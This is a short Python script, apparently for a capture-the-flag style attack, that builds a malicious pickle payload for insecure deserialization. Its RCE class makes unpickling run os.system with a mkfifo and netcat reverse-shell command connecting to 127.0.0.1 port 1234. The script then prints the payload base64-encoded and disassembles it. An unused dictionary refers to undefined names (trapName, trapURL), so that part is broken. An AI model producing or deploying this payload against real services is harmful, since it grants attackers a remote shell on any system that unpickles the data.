import pickle
import base64
import os
import pickletools


class RCE:
    def __reduce__(self):
        cmd = ('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | '
               '/bin/sh -i 2>&1 | nc 127.0.0.1 1234 > /tmp/f')
        return os.system, (cmd,)


if __name__ == '__main__':
    data = {
        'job_id': 101,
        'trap_name': trapName,
        'trap_url': trapURL,
        'completed': 0,
        'inprogress': 0,
        'health': 0
    }

    pickled = pickle.dumps(RCE())
    print(base64.urlsafe_b64encode(pickled))
    pickletools.dis(pickled)
